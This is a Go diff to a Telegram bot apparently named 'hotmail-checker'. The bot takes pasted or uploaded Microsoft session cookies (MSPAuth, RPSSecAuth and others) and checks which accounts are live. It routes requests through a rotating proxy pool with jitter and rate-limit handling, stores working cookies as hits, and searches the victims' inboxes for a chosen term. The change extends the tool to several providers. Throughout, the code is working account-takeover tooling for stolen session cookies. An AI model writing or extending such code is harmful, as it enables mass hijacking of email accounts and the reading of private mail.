@@ -11,17 +11,17 @@ import (
 	"sync"
 	"time"
 
-	"github.com/GT56GT/hotmail-checker/internal/checker"
 	"github.com/GT56GT/hotmail-checker/internal/job"
+	"github.com/GT56GT/hotmail-checker/internal/provider"
 
 	"github.com/PaulSonOfLars/gotgbot/v2"
 	"github.com/PaulSonOfLars/gotgbot/v2/ext"
 )
 
-// searchOutcome is the result of searching one account.
+// searchOutcome is the result of searching one Microsoft account.
 type searchOutcome struct {
 	Email  string
-	Items  []checker.SearchItem
+	Items  []provider.SearchItem
 	Method string
 	Reason string
 }
@@ -43,7 +43,8 @@ func (b *Bot) onMessage(bot *gotgbot.Bot, ctx *ext.Context) error {
 		return b.saveProxies(bot, m, user.Id, text)
 	}
 
-	if !looksLikeCookie(text) {
+	in := parseIntake("pasted", []byte(text), b.checkers)
+	if len(in.cookies) == 0 {
 		_, err := m.Reply(bot, usageText, &gotgbot.SendMessageOpts{
 			ParseMode: "Markdown",
 			LinkPreviewOptions: &gotgbot.LinkPreviewOptions{
@@ -57,7 +58,7 @@ func (b *Bot) onMessage(bot *gotgbot.Bot, ctx *ext.Context) error {
 	if p.kind == pendingSearch {
 		term = p.term
 	}
-	return b.startJob(bot, m, user.Id, parseIntake("pasted", []byte(text)), term)
+	return b.startJob(bot, m, user.Id, in, term)
 }
 
 func (b *Bot) onDocument(bot *gotgbot.Bot, ctx *ext.Context) error {
@@ -95,11 +96,11 @@ func (b *Bot) onDocument(bot *gotgbot.Bot, ctx *ext.Context) error {
 	if name == "" {
 		name = "upload"
 	}
-	return b.startJob(bot, m, user.Id, parseIntake(name, data), term)
+	return b.startJob(bot, m, user.Id, parseIntake(name, data, b.checkers), term)
 }
 
 // startJob validates an intake, enforces fairness limits, and runs the check.
-// When term is non-empty every live account is searched after the check.
+// When term is non-empty every live Microsoft account is searched afterwards.
 func (b *Bot) startJob(bot *gotgbot.Bot, m *gotgbot.Message, userID int64, in intake, term string) error {
 	if len(in.cookies) == 0 {
 		var sb strings.Builder
@@ -129,10 +130,11 @@ func (b *Bot) startJob(bot *gotgbot.Bot, m *gotgbot.Message, userID int64, in in
 	j.Source = in.source
 	defer b.reg.Finish(userID)
 
-	headline := fmt.Sprintf("Queued %d account(s) from %s. Starting…", len(in.cookies), in.source)
+	headline := fmt.Sprintf("Queued %d account(s) — %s\nfrom %s. Starting…",
+		len(in.cookies), in.serviceSummary(), in.source)
 	if term != "" {
-		headline = fmt.Sprintf("Queued %d account(s) from %s.\nChecking, then searching for \"%s\"…",
-			len(in.cookies), in.source, term)
+		headline = fmt.Sprintf("Queued %d account(s) — %s\nfrom %s.\nChecking, then searching Microsoft inboxes for \"%s\"…",
+			len(in.cookies), in.serviceSummary(), in.source, term)
 	}
 	if len(in.skipped) > 0 {
 		headline += fmt.Sprintf("\n(%d file(s) skipped)", len(in.skipped))
@@ -147,7 +149,7 @@ func (b *Bot) startJob(bot *gotgbot.Bot, m *gotgbot.Message, userID int64, in in
 	return nil
 }
 
-func (b *Bot) runJob(bot *gotgbot.Bot, j *job.Job, cookies []*checker.Cookie, status *gotgbot.Message, term string) {
+func (b *Bot) runJob(bot *gotgbot.Bot, j *job.Job, cookies []tagged, status *gotgbot.Message, term string) {
 	progressDone := make(chan struct{})
 	var progressWG sync.WaitGroup
 	progressWG.Add(1)
@@ -156,7 +158,7 @@ func (b *Bot) runJob(bot *gotgbot.Bot, j *job.Job, cookies []*checker.Cookie, st
 		b.progressLoop(bot, j, status, term, progressDone)
 	}()
 
-	work := make(chan *checker.Cookie)
+	work := make(chan tagged)
 	var workers sync.WaitGroup
 
 	n := b.cfg.Concurrency
@@ -171,11 +173,11 @@ func (b *Bot) runJob(bot *gotgbot.Bot, j *job.Job, cookies []*checker.Cookie, st
 		workers.Add(1)
 		go func() {
 			defer workers.Done()
-			for ck := range work {
+			for t := range work {
 				if j.Ctx.Err() != nil {
 					return
 				}
-				b.checkOne(j, ck)
+				b.checkOne(j, t)
 
 				select {
 				case <-time.After(jitter()):
@@ -187,9 +189,9 @@ func (b *Bot) runJob(bot *gotgbot.Bot, j *job.Job, cookies []*checker.Cookie, st
 	}
 
 feed:
-	for _, ck := range cookies {
+	for _, t := range cookies {
 		select {
-		case work <- ck:
+		case work <- t:
 		case <-j.Ctx.Done():
 			break feed
 		}
@@ -200,7 +202,7 @@ feed:
 	close(progressDone)
 	progressWG.Wait()
 
-	var searches []searchOutcome
+	var searches map[int]searchOutcome
 	if term != "" && j.Ctx.Err() == nil {
 		searches = b.runSearches(bot, j, status, term)
 	}
@@ -209,7 +211,7 @@ feed:
 	b.deliver(bot, j, status, searches, term)
 }
 
-func (b *Bot) checkOne(j *job.Job, ck *checker.Cookie) {
+func (b *Bot) checkOne(j *job.Job, t tagged) {
 	ctx, cancel := context.WithTimeout(j.Ctx, b.cfg.Timeout+10*time.Second)
 	defer cancel()
 
@@ -225,30 +227,32 @@ func (b *Bot) checkOne(j *job.Job, ck *checker.Cookie) {
 	}
 	defer release()
 
-	res := b.chk.Check(ctx, ck, entry.URL)
+	res := t.checker.Check(ctx, t.cookie, entry.URL)
 
 	switch res.Verdict {
-	case checker.Live:
+	case provider.Live:
 		pool.Report(entry, true)
 		j.AddHit(job.Hit{
-			Email:   res.Email,
-			Name:    res.Name,
-			Cookie:  ck.Header(),
-			Cookies: ck.Values,
-			Proxy:   res.Proxy,
+			Provider: t.checker.Name(),
+			Email:    res.Email,
+			Name:     res.Name,
+			Cookie:   t.cookie.Header(),
+			Cookies:  t.cookie.Values,
+			Proxy:    res.Proxy,
+			Meta:     res.Meta,
 		})
 
-	case checker.Dead:
+	case provider.Dead:
 		pool.Report(entry, true)
-		j.AddDead(ck.Label())
+		j.AddDead(t.cookie.Label())
 
-	case checker.Challenged:
+	case provider.Challenged:
 		// The session authenticated but needs consent or re-auth, so the proxy
 		// is working — do not penalise it.
 		pool.Report(entry, true)
-		j.AddChallenged(res.Reason)
+		j.AddChallenged(t.checker.Label() + ": " + res.Reason)
 
-	case checker.RateLimited:
+	case provider.RateLimited:
 		pool.Report(entry, false)
 		j.AddErr("rate limited")
 
@@ -258,36 +262,51 @@ func (b *Bot) checkOne(j *job.Job, ck *checker.Cookie) {
 	}
 }
 
-// runSearches queries the inboxes of live hits, capped at MAX_SEARCH_ACCOUNTS.
-func (b *Bot) runSearches(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, term string) []searchOutcome {
+// runSearches queries Microsoft inboxes. Results are keyed by index in the
+// hits slice so mixed-service batches stay aligned.
+func (b *Bot) runSearches(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, term string) map[int]searchOutcome {
+	if b.ms == nil {
+		return nil
+	}
+
 	hits, _, _, _ := j.Results()
-	if len(hits) == 0 {
+
+	var idx []int
+	for i, h := range hits {
+		if h.Provider == "microsoft" {
+			idx = append(idx, i)
+		}
+	}
+	if len(idx) == 0 {
 		return nil
 	}
 
 	limit := b.cfg.MaxSearchAccounts
-	if limit <= 0 || len(hits) < limit {
-		limit = len(hits)
+	if limit <= 0 || len(idx) < limit {
+		limit = len(idx)
 	}
-	targets := hits[:limit]
+	idx = idx[:limit]
 
 	_, _, _ = status.EditText(bot, &gotgbot.EditMessageTextOpts{
-		Text: fmt.Sprintf("Checking done. Searching %d inbox(es) for \"%s\"…", len(targets), term),
+		Text: fmt.Sprintf("Checking done. Searching %d Microsoft inbox(es) for \"%s\"…", len(idx), term),
 	})
 
-	out := make([]searchOutcome, len(targets))
+	out := make(map[int]searchOutcome, len(idx))
 	sem := make(chan struct{}, 3)
 	var wg sync.WaitGroup
+	var mu sync.Mutex
 
-	for i, h := range targets {
+	for _, hitIdx := range idx {
 		wg.Add(1)
-		go func(i int, h job.Hit) {
+		go func(hitIdx int, h job.Hit) {
 			defer wg.Done()
 
 			select {
 			case sem <- struct{}{}:
 			case <-j.Ctx.Done():
-				out[i] = searchOutcome{Email: h.Email, Reason: "cancelled"}
+				mu.Lock()
+				out[hitIdx] = searchOutcome{Email: h.Email, Reason: "cancelled"}
+				mu.Unlock()
 				return
 			}
 			defer func() { <-sem }()
@@ -302,21 +321,25 @@ func (b *Bot) runSearches(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message,
 				entry, release, err = pool.Acquire(ctx)
 			}
 			if err != nil {
-				out[i] = searchOutcome{Email: h.Email, Reason: "pool: " + err.Error()}
+				mu.Lock()
+				out[hitIdx] = searchOutcome{Email: h.Email, Reason: "pool: " + err.Error()}
+				mu.Unlock()
 				return
 			}
 			defer release()
 
-			ck := &checker.Cookie{Values: h.Cookies}
-			res := b.chk.Search(ctx, ck, entry.URL, term, b.cfg.SearchResultsLimit)
+			ck := &provider.Cookie{Values: h.Cookies}
+			res := b.ms.Search(ctx, ck, entry.URL, term, b.cfg.SearchResultsLimit)
 
-			out[i] = searchOutcome{
+			mu.Lock()
+			out[hitIdx] = searchOutcome{
 				Email:  h.Email,
 				Items:  res.Items,
 				Method: res.Method,
 				Reason: res.Reason,
 			}
-		}(i, h)
+			mu.Unlock()
+		}(hitIdx, hits[hitIdx])
 	}
 	wg.Wait()
 
@@ -362,7 +385,7 @@ func (b *Bot) progressLoop(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message
 	}
 }
 
-func (b *Bot) deliver(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, searches []searchOutcome, term string) {
+func (b *Bot) deliver(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, searches map[int]searchOutcome, term string) {
 	hits, dead, challenged, errs := j.Results()
 
 	summary := fmt.Sprintf(
@@ -420,7 +443,7 @@ func (b *Bot) deliver(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, sea
 	}
 }
 
-func countMatches(searches []searchOutcome) int {
+func countMatches(searches map[int]searchOutcome) int {
 	n := 0
 	for _, s := range searches {
 		n += len(s.Items)
@@ -455,15 +478,6 @@ func (b *Bot) downloadFile(fileID string) ([]byte, error) {
 	return io.ReadAll(io.LimitReader(resp.Body, maxDocBytes))
 }
 
-func looksLikeCookie(s string) bool {
-	for _, marker := range []string{"MSPAuth", "MSPProf", "ANON=", "RPSSecAuth", "__Host-MSAAUTHP"} {
-		if strings.Contains(s, marker) {
-			return true
-		}
-	}
-	return false
-}
-
 func jitter() time.Duration {
 	return time.Duration(200+rand.Intn(500)) * time.Millisecond
 }
@@ -490,4 +504,8 @@ func summariseIssues(issues []error) string {
 		sb.WriteString("• " + err.Error() + "\n")
 	}
 	return strings.TrimSpace(sb.String())
+}
+
+func joinComma(items []string) string {
+	return strings.Join(items, ", ")
 }
